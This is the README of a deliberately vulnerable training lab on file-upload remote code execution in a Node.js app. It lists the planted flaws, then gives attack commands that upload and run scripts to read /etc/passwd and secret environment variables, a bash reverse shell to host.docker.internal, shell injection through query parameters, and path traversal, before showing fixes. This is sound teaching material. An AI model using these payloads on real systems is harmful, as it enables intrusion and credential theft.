# Lab 09 — RCE via File Upload 🔴🔴

**Port:** `8009`  
**Stack:** Node.js + MySQL  
**Difficulty:** Intermediate–Advanced

---

## 🕳️ Security Loopholes

1. **No File Type Validation** — Accepts `.sh`, `.js`, `.py`, and any other extension
2. **Executable File Execution Endpoint** — `/run/:filename` literally executes uploaded files
3. **Original Filename Preserved** — Enables path traversal (`../../../etc/passwd`)
4. **Shell Injection in Image Processor** — `filename` and `width` passed directly to shell command

---

## 🎯 Attack Scenarios

### Scenario A — Upload & Execute Shell Script
```bash
docker compose up -d

# Create a reverse shell script
cat > shell.sh << 'SHELL'
#!/bin/bash
id
whoami
cat /etc/passwd
ls /tmp/uploads/
env | grep -i secret
SHELL

# Upload it
curl -X POST http://localhost:8009/upload \
  -F "file=@shell.sh"

# Execute it
curl http://localhost:8009/run/shell.sh
```

### Scenario B — Node.js Payload for Deeper Access
```bash
cat > payload.js << 'JS'
const { execSync } = require('child_process');
const os = require('os');
console.log('=== System Info ===');
console.log('Hostname:', os.hostname());
console.log('Env:', JSON.stringify(process.env));
console.log('Files:', execSync('ls -la /tmp/uploads').toString());
console.log('Network:', execSync('cat /etc/hosts').toString());
JS

curl -X POST http://localhost:8009/upload -F "file=@payload.js"
curl http://localhost:8009/run/payload.js
```

### Scenario C — Reverse Shell
```bash
# Start listener on your machine
nc -lvnp 4444

# Upload reverse shell
cat > revshell.sh << 'SHELL'
bash -i >& /dev/tcp/host.docker.internal/4444 0>&1
SHELL

curl -X POST http://localhost:8009/upload -F "file=@revshell.sh"
curl http://localhost:8009/run/revshell.sh
```

### Scenario D — Shell Injection via Image Processor
```bash
# Inject into filename parameter
curl "http://localhost:8009/process-image?filename=x.jpg;id&width=100"
curl "http://localhost:8009/process-image?filename=x.jpg%3Bcat+/etc/passwd&width=100"

# Inject into width parameter
curl "http://localhost:8009/process-image?filename=x.jpg&width=100;whoami"
```

### Scenario E — Path Traversal in Upload
```bash
# Try to write to a sensitive path
curl -X POST http://localhost:8009/upload \
  -F "file=@shell.sh;filename=../../app.js"
```

---

## 🛠️ Tools

| Tool | Use |
|------|-----|
| `curl` | Manual payload upload |
| `nc` | Reverse shell listener |
| Burp Suite | Intercept and modify `Content-Type` / filename |
| `weevely` | PHP webshell generator (for PHP targets) |

---

## 🔐 How to Fix

```javascript
const path = require('path');
const crypto = require('crypto');

// 1. Allowlist ONLY safe extensions
const ALLOWED_EXT = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
const ALLOWED_MIME = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];

const fileFilter = (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase();
  if (!ALLOWED_EXT.includes(ext) || !ALLOWED_MIME.includes(file.mimetype)) {
    return cb(new Error('File type not allowed'));
  }
  cb(null, true);
};

// 2. Never use original filename — generate random name
const filename = (req, file, cb) => {
  const randomName = crypto.randomBytes(16).toString('hex');
  const ext = '.jpg'; // Force safe extension regardless of upload
  cb(null, randomName + ext);
};

// 3. Store outside web root, never serve directly
// 4. Run antivirus scan on uploads
// 5. NEVER execute uploaded files
// 6. Use shell argument arrays, not string concatenation
const { execFile } = require('child_process');
execFile('convert', [safePath, '-resize', safeWidth, outPath], callback);
```
